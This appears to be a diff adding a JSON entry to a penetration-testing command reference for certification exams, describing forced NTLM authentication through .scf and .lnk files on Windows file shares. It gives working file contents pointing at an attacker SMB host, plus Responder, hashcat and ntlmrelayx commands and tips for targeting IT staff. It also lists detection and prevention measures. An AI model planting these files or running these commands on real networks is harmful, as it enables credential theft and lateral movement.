@@ -1,0 +1,102 @@
+{
+  "type": "command",
+  "platform": "windows",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [
+    "smb"
+  ],
+  "tools": [
+    "responder",
+    "hashcat"
+  ],
+  "tags": [
+    "scf",
+    "responder",
+    "ntlmv2"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Windows - Interacting with Users",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 26: Windows Privilege Escalation",
+  "examples": [
+    {
+      "label": "Malicious .scf pointing at your SMB host",
+      "command": "# pwn.scf: [Shell] Command=2 IconFile=\\\\10.10.14.3\\share\\legit.ico [Taskbar] Command=ToggleDesktop"
+    },
+    {
+      "label": "Start Responder to capture the NTLMv2 hash",
+      "command": "sudo responder -w -v -I tun0"
+    },
+    {
+      "label": "Crack the captured hash",
+      "command": "hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt"
+    },
+    {
+      "label": "Alt: malicious .lnk icon path forces the auth",
+      "command": "$l=(New-Object -ComObj WScript.Shell).CreateShortcut('C:\\share\\legit.lnk'); $l.IconLocation='\\\\<lhost>\\x\\x.ico'; $l.Save()"
+    }
+  ],
+  "notes": "=== SCF/LNK File on Share — NTLMv2 Hash Capture ===\nPlace malicious file on file share to capture NTLMv2 hashes when users browse the directory.\n\n=== SCF FILE METHOD ===\nShell Command Files (.scf) are parsed by Windows Explorer when a directory is accessed.\nIconFile field specifies where Explorer loads the icon from.\nPointing IconFile to a UNC path on attacker's SMB server → Windows initiates SMB authentication.\n\nMalicious @Inventory.scf content:\n  [Shell]\n  Command=2\n  IconFile=\\\\ATTACKER_IP\\share\\icon.ico\n  [Taskbar]\n  Command=ToggleDesktop\n\nLeading @ in filename sorts it to TOP of directory listing → processed immediately when folder opens.\nLIMITATION: SCF files no longer work on Windows Server 2019 (ignores UNC icon path).\n\n=== LNK FILE METHOD (Works on Server 2019 and modern Win10) ===\nPowerShell to create malicious shortcut:\n  $obj = New-Object -ComObject WScript.Shell\n  $link = $obj.CreateShortcut(\"C:\\staging\\@Inventory.lnk\")\n  $link.TargetPath = \"\\\\ATTACKER_IP\\share\\something\"\n  $link.Save()\n\nWhen Explorer renders the shortcut thumbnail → resolves UNC path → sends NTLMv2 hash to Responder.\nLnkbomb tool automates malicious .lnk generation.\n\n=== RESPONDER SETUP ===\n  sudo responder -I eth0 -wPv\n  → Captures NTLMv2 hashes from incoming SMB authentication attempts\n\n=== CRACKING CAPTURED HASHES ===\n  hashcat -m 5600 captured.hash /usr/share/wordlists/rockyou.txt\n  hashcat -m 5600 captured.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule\n\n=== PLACEMENT STRATEGY ===\nHigh-traffic shares (IT tools, deployment scripts, shared resources) = more hashes in less time\nShares browsed by IT staff = high-privilege account hashes (priority crack targets)\nFile name starting with @ = sorts to top of directory → processed first by every user\n\n=== CHAINING CONTEXT ===\nCaptured NTLMv2 → crack offline → plaintext domain credentials → lateral movement\nCaptured DA/privileged user hash → ntlmrelayx relay → immediate authentication without cracking\nMultiple hashes from one share → parallel cracking → compound credential harvest\nRelay instead of crack: ntlmrelayx -t smb://<DC_IP> -smb2support → relay to DA operations\n\n=== WHAT TO LOOK FOR ===\nFile shares accessible to domain users = placement opportunity\nHeavily-used IT shares = fastest hash collection\nServer 2019 targets → use .lnk instead of .scf\nAlways confirm hash capture and offline cracking are in scope before deploying",
+  "references": [
+    {
+      "title": "Responder (lgandx)",
+      "url": "https://github.com/lgandx/Responder"
+    },
+    {
+      "title": "HTB Academy - Windows Privilege Escalation",
+      "url": "https://academy.hackthebox.com/module/details/67"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "clipboard-logger",
+      "note": "Another interacting-with-users capture technique.",
+      "rel": "alternative"
+    },
+    {
+      "id": "process-cmdline-monitor",
+      "note": "Watch privileged processes for creds too.",
+      "rel": "alternative"
+    },
+    {
+      "id": "ad-responder-crack",
+      "rel": "prereq",
+      "note": "Confirm/enumerate this first"
+    }
+  ],
+  "id": "scf-responder-hash",
+  "name": "Interacting with Users - SCF Forced Auth",
+  "command": "# drop a malicious .scf in a writable share; Responder captures the NTLMv2 hash on browse",
+  "description": "An SCF file with an IconFile pointing at your SMB host forces any user who browses the folder to authenticate to you. Capture the NTLMv2 hash with Responder and crack it offline.",
+  "opsec": "loud",
+  "mitre": [
+    "T1187"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "A Shell Command File (.scf) with an IconFile pointing to a UNC path (\\\\attacker\\share\\legit.ico) causes Windows Explorer to automatically attempt to load the icon from the UNC path when the containing folder is viewed. This triggers an NTLM authentication request to the attacker's SMB server (Responder), capturing the user's NTLMv2 hash without any user interaction beyond browsing the folder.",
+    "prerequisites": "Write access to a shared folder that privileged users browse. Responder running on the attacker machine. Network connectivity from the target to the attacker's IP on port 445.",
+    "impact": "Capture of NTLMv2 hashes from any user who browses the folder containing the SCF file. Hashes cracked offline (hashcat -m 5600) or relayed for authentication if SMB signing is not enforced.",
+    "detection": "New .scf file appearing in shared folder (File integrity monitoring). Unusual NTLM authentication attempt from workstation to non-domain IP on port 445. Network: SMB traffic to attacker IP. SIEM: outbound SMB to external IPs.",
+    "artifacts": "File system: @Inventory.scf with external UNC path | Network: NTLM authentication to attacker IP port 445 | Responder capture: NTLMv2 hash | Security event: NTLM auth attempt with unusual target",
+    "prevention": "Enforce SMB signing to prevent NTLM relay (mitigates relay; hash capture still possible). Disable NTLM authentication where possible (Kerberos-only). Block outbound SMB (port 445) at the perimeter firewall. Deploy file integrity monitoring on shared folders. Remove write access for non-admin users on shared folders.",
+    "misconfiguration": "Shared folders allow write access to standard users. Outbound SMB not blocked at firewall. SMB signing not enforced. No file integrity monitoring on shares.",
+    "vulnerable_config": "# Malicious SCF file written to shared folder:\n# @Inventory.scf\n[Shell]\nCommand=2\nIconFile=\\\\10.10.14.3\\share\\legit.ico\n[Taskbar]\nCommand=ToggleDesktop\n\n# When domain user browses folder:\nsudo responder -w -v -I tun0\n# Captures: USER::DOMAIN:...(NTLMv2 hash)",
+    "secure_config": "# Enforce SMB signing (prevents relay):\nSet-SmbServerConfiguration -RequireSecuritySignature $true\n\n# Block outbound SMB at firewall\n# Block TCP/445 outbound from workstations to non-DC IPs\n\n# Remove user write access on shares where not needed\n# Minimum: read-only for standard users\n\n# Monitor for new .scf files in shared directories",
+    "sources": [
+      "HTB M26",
+      "MITRE T1187",
+      "MITRE T1557.001"
+    ]
+  }
+}
